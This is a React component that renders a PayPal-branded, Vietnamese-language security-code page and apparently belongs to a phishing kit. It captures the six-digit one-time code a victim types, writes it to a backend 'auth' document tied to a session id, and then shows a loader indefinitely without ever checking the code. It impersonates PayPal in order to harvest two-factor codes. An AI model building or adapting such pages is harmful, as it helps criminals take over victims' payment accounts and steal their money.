import { useContext, useState } from 'react';
import './otp.css';
import logo from '../../assets/paypal-mark-color.svg';
import { updateDocument } from '../../services/api';
import { AppIDProvider } from '../../context/AppContext';
export default function Otp() {
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [otp, setOtp] = useState(new Array(6).fill(''));
  const id = useContext(AppIDProvider);

  const verifyOTP = () => {
    updateDocument('auth', {otp: otp.join('')}, id );
    setIsLoading(true);
  }
  const handleChange = (element:any, index:number) => {
    if (isNaN(element.value)) return false;
    setOtp([...otp.map((d, idx) => (idx === index ? element.value : d))]);

    if (element.nextSibling) {
      element.nextSibling.focus();
    }
  };
  return (
    <div>
      <div className="otp-relative">
      <div className="otp-container">
        <div className="top">
          <div className="logo">
            <img
              src={logo}
              alt="PayPal Logo"
            />
          </div>

          <h2 className="enter-code">Nhập mã của bạn</h2>
          <p className="description">
            Chúng tôi đã gửi mã bảo mật đến ‪+84 ••• ••• •••‬.
          </p>
          <span className="send-new-code">Gửi mã mới </span>
          <div className="otp-box">
            <div className="otp-inputs">
            {otp.map((data, index) => (
              <input
                key={index}
                type="text"
                name="otp"
                maxLength={1}
                value={data}
                onChange={(e) => handleChange(e.target, index)}
                onFocus={(e) => e.target.select()}
                id={`otp-${index+1}`}
                className="otp-input"
              />
            ))}
            </div>
            <p id="message"></p>
          </div>
          <button id="submitBtn" onClick={verifyOTP}>Gửi</button>
          <span className="more-option">Bạn cần thêm lựa chọn?</span>
        </div>
      </div>
      {isLoading &&
        <div className="loading-container" id="loader">
          <div className="loader"></div>
        </div>
      
      }
      <div className="otp-footer">
        <span className="bottom more-option">Quay lại phần đăng nhập</span>
        <ul className="link-group">
          <li className="link-item">Liên hệ với chúng tôi</li>
          <li className="link-item">Quyền riêng tư</li>
          <li className="link-item">Pháp lý</li>
          <li className="link-item">Toàn cầu</li>
        </ul>
      </div>
    </div>
    </div>
  )
}
